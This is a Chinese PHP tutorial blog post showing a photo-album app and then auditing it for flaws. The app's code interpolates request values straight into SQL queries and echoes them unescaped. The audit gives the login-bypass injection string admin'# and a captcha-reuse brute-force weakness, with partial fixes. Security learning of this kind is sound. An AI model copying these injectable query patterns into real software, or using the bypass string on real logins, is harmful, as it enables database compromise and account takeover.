class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果用户没有登录，则直接跳转到login.php</span></span><br><span class="line">header(<span class="string">&quot;location:./login.php&quot;</span>); </span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断表单的来源是否合法</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;token&#x27;</span>]==$_SESSION[<span class="string">&#x27;token&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//**********************上传图片*******************************</span></span><br><span class="line"><span class="comment">//(1)判断上传图片是否有错误发生</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;上传图片有错误发生！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=./upload.php&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2)判断上传文件内容类型是不是图片</span></span><br><span class="line">$arr1 = <span class="keyword">array</span>(<span class="string">&quot;image/jpeg&quot;</span>,<span class="string">&quot;image/png&quot;</span>,<span class="string">&quot;image/gif&quot;</span>);</span><br><span class="line"><span class="comment">//创建finfo的资源：获取文件内容类型，与扩展名无关</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="comment">//获取文件内容的原始类型，不会随着扩展名改名而改变</span></span><br><span class="line">$mime = finfo_file($finfo,$_FILES[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!in_array($mime,$arr1))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;上传的必须是图像！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=./upload.php&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(3)判断上传的文件扩展名是不是图片</span></span><br><span class="line">$arr2 = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line">$ext  = pathinfo($_FILES[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION); <span class="comment">//文件扩展名</span></span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$arr2))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;上传的必须是图像！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=./upload.php&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(4)移动图片到 images目录中</span></span><br><span class="line">$tmp_name = $_FILES[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">$dst_name = <span class="string">&quot;./images/&quot;</span>.uniqid().<span class="string">&quot;.&quot;</span>.$ext;</span><br><span class="line">move_uploaded_file($tmp_name,$dst_name);</span><br><span class="line"></span><br><span class="line"><span class="comment">//***********************将表单提交数据保存到数据库****************************</span></span><br><span class="line"><span class="comment">//(1)获取表单提交数据</span></span><br><span class="line">$title= $_POST[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">$intro = $_POST[<span class="string">&#x27;intro&#x27;</span>];</span><br><span class="line">$imgsrc = $dst_name; <span class="comment">//将图片路径保存到数据库</span></span><br><span class="line">$addate = time();</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2)判断记录是否添加成功</span></span><br><span class="line">$sql = <span class="string">&quot;INSERT INTO photos VALUES(null,&#x27;<span class="subst">$title</span>&#x27;,&#x27;<span class="subst">$imgsrc</span>&#x27;,&#x27;<span class="subst">$intro</span>&#x27;,0,<span class="subst">$addate</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(mysqli_query($link, $sql))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;上传照片成功！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=./index.php&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//直接跳转到index.php页面</span></span><br><span class="line">header(<span class="string">&quot;location:./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//开启SESSION会话</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//判断用户是否登录</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果用户没有登录，则直接跳转到login.php</span></span><br><span class="line">header(<span class="string">&quot;location:./login.php&quot;</span>); </span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//产生表单验证随机字符串</span></span><br><span class="line">$_SESSION[<span class="string">&#x27;token&#x27;</span>] = uniqid();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;上传照片&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line"><span class="comment">/*全局样式*/</span></span><br><span class="line">body,h2,form,a&#123;margin:<span class="number">0</span>px;padding:<span class="number">0</span>px&#125;</span><br><span class="line">body&#123;font-size:<span class="number">14</span>px;color:<span class="comment">#444;background-color:#00343f;&#125;</span></span><br><span class="line">a&#123;text-decoration:none;color:<span class="comment">#444;&#125;</span></span><br><span class="line">a:hover&#123;color:red;&#125; </span><br><span class="line"><span class="comment">/*局部样式*/</span></span><br><span class="line">.box&#123;width:<span class="number">1000</span>px;margin:<span class="number">0</span>px auto;background-color:white;&#125;</span><br><span class="line">.title&#123;</span><br><span class="line">text-align:center;</span><br><span class="line">padding: <span class="number">10</span>px <span class="number">0</span>px;</span><br><span class="line">border-bottom: <span class="number">2</span>px solid <span class="comment">#444;</span></span><br><span class="line">background-color:<span class="comment">#d0e9ff;</span></span><br><span class="line">&#125;</span><br><span class="line">.title h2&#123;font-size:<span class="number">36</span>px;padding:<span class="number">10</span>px;&#125;</span><br><span class="line">form&#123;padding:<span class="number">30</span>px;height:<span class="number">400</span>px;&#125;</span><br><span class="line">form td&#123;padding:<span class="number">8</span>px;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">&lt;!--title--&gt;</span><br><span class="line">&lt;div class=&quot;title&quot;&gt;</span><br><span class="line">&lt;h2&gt;上传照片&lt;/h2&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./index.php&quot;</span>&gt;返回首页&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;&lt;!--<span class="comment">//title--&gt;</span></span><br><span class="line">&lt;!--form--&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;uploadSave.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;table align=<span class="string">&quot;center&quot;</span> width=<span class="string">&quot;600&quot;</span>&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td width=<span class="string">&quot;100&quot;</span> align=<span class="string">&quot;right&quot;</span>&gt;照片标题：&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;title&quot;</span> size=<span class="string">&quot;60&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=<span class="string">&quot;right&quot;</span>&gt;上传照片：&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;uploadFile&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=<span class="string">&quot;right&quot;</span>&gt;照片描述：&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;textarea name=<span class="string">&quot;intro&quot;</span> cols=<span class="string">&quot;45&quot;</span> rows=<span class="string">&quot;5&quot;</span>&gt;&lt;/textarea&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;&lt;/td&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;token&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;token&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;reset&quot;</span> value=<span class="string">&quot;重置&quot;</span>&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/form&gt;&lt;!--<span class="comment">//form--&gt;</span></span><br><span class="line">&lt;/div&gt;&lt;!--<span class="comment">//box--&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="显示图片功能"><a href="#显示图片功能" class="headerlink" title="显示图片功能"></a>显示图片功能</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含连接数据库的公共文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//开启SESSION会话</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//判断用户是否登录</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果用户没有登录，则直接跳转到login.php</span></span><br><span class="line">header(<span class="string">&quot;location:./login.php&quot;</span>); </span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取地址栏传递的id</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//更新访问量</span></span><br><span class="line">$sql = <span class="string">&quot;UPDATE photos SET hits=hits+1 WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">mysqli_query($link,$sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建查询的SQL语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM photos WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="comment">//执行SQL语句，返回结果集对象</span></span><br><span class="line">$result = mysqli_query($link, $sql);</span><br><span class="line"><span class="comment">//获取一行数据</span></span><br><span class="line">$arr = mysqli_fetch_assoc($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;照片详细信息&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line"><span class="comment">/*全局样式*/</span></span><br><span class="line">body,ul,li,h2,a&#123;margin:<span class="number">0</span>px;padding:<span class="number">0</span>px&#125;</span><br><span class="line">body&#123;font-size:<span class="number">14</span>px;color:<span class="comment">#444;background-color:#00343f;&#125;</span></span><br><span class="line">ul,li&#123;<span class="keyword">list</span>-style: none;&#125;</span><br><span class="line">a&#123;text-decoration:none;color:<span class="comment">#444;&#125;</span></span><br><span class="line">a:hover&#123;color:red;&#125; </span><br><span class="line"><span class="comment">/*局部样式*/</span></span><br><span class="line">.box&#123;width:<span class="number">1000</span>px;margin:<span class="number">0</span>px auto;background-color:white;&#125;</span><br><span class="line">.title&#123;</span><br><span class="line">text-align:center;</span><br><span class="line">padding: <span class="number">10</span>px <span class="number">0</span>px;</span><br><span class="line">border-bottom: <span class="number">2</span>px solid <span class="comment">#444;</span></span><br><span class="line">background-color:<span class="comment">#d0e9ff;</span></span><br><span class="line">&#125;</span><br><span class="line">.title h2&#123;font-size:<span class="number">36</span>px;padding:<span class="number">10</span>px;&#125;</span><br><span class="line">.detail&#123;padding:<span class="number">15</span>px <span class="number">100</span>px;&#125;</span><br><span class="line">.detail div&#123;text-align:center;&#125;</span><br><span class="line">.detail img&#123;width:<span class="number">640</span>px;&#125;</span><br><span class="line">.detail p&#123;font-size:<span class="number">16</span>px;text-indent: <span class="number">36</span>px; font-family: 微软雅黑;line-height: <span class="number">28</span>px;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">&lt;!--title--&gt;</span><br><span class="line">&lt;div class=&quot;title&quot;&gt;</span><br><span class="line">&lt;h2&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;title&#x27;</span>]<span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">访问&lt;font color=red&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;hits&#x27;</span>]<span class="meta">?&gt;</span>&lt;/font&gt;次，</span><br><span class="line">发布时间 &lt;font color=red&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,$arr[<span class="string">&#x27;addate&#x27;</span>])<span class="meta">?&gt;</span>&lt;/font&gt;，</span><br><span class="line">&lt;a href=<span class="string">&quot;./index.php&quot;</span>&gt;返回首页&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;&lt;!--<span class="comment">//title--&gt;</span></span><br><span class="line">&lt;!--photos--&gt;</span><br><span class="line">&lt;div class=&quot;detail&quot;&gt;</span><br><span class="line">&lt;div class=&quot;photo&quot;&gt;&lt;img align=&quot;center&quot; src=&quot;&lt;?php echo $arr[&#x27;imgsrc&#x27;]?&gt;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;intro&#x27;</span>]<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;&lt;!--<span class="comment">//photos--&gt;</span></span><br><span class="line">&lt;/div&gt;&lt;!--<span class="comment">//box--&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="验证码功能"><a href="#验证码功能" class="headerlink" title="验证码功能"></a>验证码功能</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//(1)产生4位随机验证码字符串</span></span><br><span class="line">$arr1 = array_merge(range(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;z&#x27;</span>),range(<span class="number">0</span>,<span class="number">9</span>),range(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>));</span><br><span class="line">shuffle($arr1);</span><br><span class="line">$arr2 = array_rand($arr1,<span class="number">4</span>);</span><br><span class="line">$str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($arr2 <span class="keyword">as</span> $index)</span><br><span class="line">&#123;</span><br><span class="line">$str .= $arr1[$index];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将验证码字符串保存到SESSION中</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;captcha&#x27;</span>] = strtolower($str);</span><br></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h4 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h4><h5 id="登录处"><a href="#登录处" class="headerlink" title="登录处"></a>登录处</h5><h6 id="万能密码登录"><a href="#万能密码登录" class="headerlink" title="万能密码登录"></a>万能密码登录</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;#</span><br></pre></td></tr></table></figure><p>后台语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;SELECT * FROM user WHERE username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;;</span><br><span class="line">$result &#x3D; mysqli_query($link, $sql); &#x2F;&#x2F;执行SQL语句，并返回结果集对象</span><br><span class="line">$records &#x3D; mysqli_num_rows($result); &#x2F;&#x2F;取回记录数：0没找到，1找到了</span><br></pre></td></tr></table></figure><p>修复</p><p>对参数进行过滤，将账户和密码分离开验证。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;SELECT password FROM user WHERE username&#x3D;&#39;admin&#39;&quot;;</span><br><span class="line">$result &#x3D; mysqli_query($link, $sql); &#x2F;&#x2F;执行SQL语句，并返回结果集对象</span><br><span class="line">$password2 &#x3D; mysqli_fetch_row($result); &#x2F;&#x2F;取回记录数：0没找到，1找到了</span><br></pre></td></tr></table></figure><h6 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h6><p>登录页面可暴力破解</p><p>后台语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;SELECT * FROM user WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">$result = mysqli_query($link, $sql); <span class="comment">//执行SQL语句，并返回结果集对象</span></span><br><span class="line">$records = mysqli_num_rows($result); <span class="comment">//取回记录数：0没找到，1找到了</span></span><br><span class="line"><span class="keyword">if</span>(!$records)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;用户名或密码不正确！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=./login.php&quot;</span>);</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然有限制码限制，但是每次登录失败之后，session中的验证码没有及时的摧毁，导致验证码可以重复利用，进而导致账户密码可以暴力破解。</p><p>修复</p><p>在每次登录失败之后销毁cookie中的验证码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset($_SESSION[&#39;captcha&#39;]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--核心编程2</title>
      <link href="2019/12/07/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B2/"/>
      <url>2019/12/07/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B2/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP核心编程2"><a href="#PHP核心编程2" class="headerlink" title="PHP核心编程2"></a>PHP核心编程2</h1><h2 id="PHP与文件上传"><a href="#PHP与文件上传" class="headerlink" title="PHP与文件上传"></a>PHP与文件上传</h2><p>upload.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传原理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span>&gt;</span></span><br><span class="line">上传图片1：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFile&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//判断表单是否合法提交</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;token&#x27;</span>]==<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">print_r($_FILES);</span><br><span class="line"><span class="comment">//将三维数组，转成二维数组</span></span><br><span class="line">$arrs = $_FILES[<span class="string">&#x27;uploadFile&#x27;</span>];</span><br><span class="line"><span class="comment">//循环判断，只需要移动有文件上传的</span></span><br><span class="line"><span class="keyword">foreach</span>($arrs[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">as</span> $key=&gt;$name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果文件不则，则移动文件</span></span><br><span class="line"><span class="keyword">if</span>($name != <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">$tmp_name = $arrs[<span class="string">&#x27;tmp_name&#x27;</span>][$key];</span><br><span class="line">$dst_name = <span class="string">&quot;./upload/&quot;</span>.uniqid().<span class="string">&quot;.&quot;</span>.$ext;</span><br><span class="line">move_uploaded_file($tmp_name,$dst_name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;非法操作&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="超全局变量数组-FILES"><a href="#超全局变量数组-FILES" class="headerlink" title="超全局变量数组 $_FILES"></a>超全局变量数组 $_FILES</h3><p>$_POST数组中保存的是普通表单元素数据。</p><p>$_FILES数组中保存的是上传文件的信息。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 